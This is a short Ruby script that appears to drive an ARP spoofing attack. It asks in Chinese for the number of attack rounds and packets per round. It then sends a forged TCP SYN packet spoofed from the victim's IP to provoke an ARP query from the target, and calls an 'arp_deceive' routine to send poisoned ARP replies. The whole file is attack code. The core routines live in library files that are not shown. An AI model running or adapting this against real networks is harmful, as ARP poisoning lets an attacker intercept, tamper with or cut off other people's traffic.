require_relative '../config_con_var.rb'
require_relative '../lib/attack_tool/arp/arp_deceive.rb'
require_relative '../lib/protocol/tcp_pac.rb'

puts color_azure("输入攻击次数: ")
redo_time = read_num
puts color_azure("输入每次攻击发送包数目: ")
scale = read_num

trigger_pac = TCPP.syn_pac{|pac| pac.ipv4h.set_addr_by_arr($victim_ip, :src)}
$pcap.send_packet(trigger_pac)	#诱发目标机发出对victim_ip的arp询问
ARPP.arp_deceive($pcap, redo_time, scale)